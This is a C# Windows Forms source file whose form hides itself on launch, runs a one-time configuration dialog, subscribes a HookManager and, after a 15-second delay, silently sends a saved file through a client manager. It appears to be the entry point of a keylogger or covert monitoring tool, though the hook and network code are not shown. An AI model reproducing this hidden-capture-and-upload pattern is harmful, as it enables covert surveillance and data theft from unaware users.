﻿using System.Windows.Forms;
using System.Threading.Tasks;

namespace ComeBackLuci
{
    public partial class CBL: Form
    {
        private HookManager _hm = null;

        public CBL()
        {
            InitializeComponent();
        }

        private void CBL_Load(object sender, System.EventArgs e)
        {
            this.Hide();

            if (!SettingsManager.Setup)
            {
                using (ConfigDC config = new ConfigDC())
                {
                    config.ShowDialog();
                }

                SettingsManager.Setup = true;
                SettingsManager.Save();
            }

            if (SettingsManager.LastFile != string.Empty)
            {
                string lastFile = SettingsManager.LastFile;

                Task.Run(async () =>
                {
                    await Task.Delay(15000);

                    ClientManager.SendFile(lastFile);
                });
            }

            _hm = new HookManager();
            _hm.Subscribe();
        }

        private void CBL_FormClosing(object sender, FormClosingEventArgs e)
        {
            _hm?.Dispose();
        }
    }
}
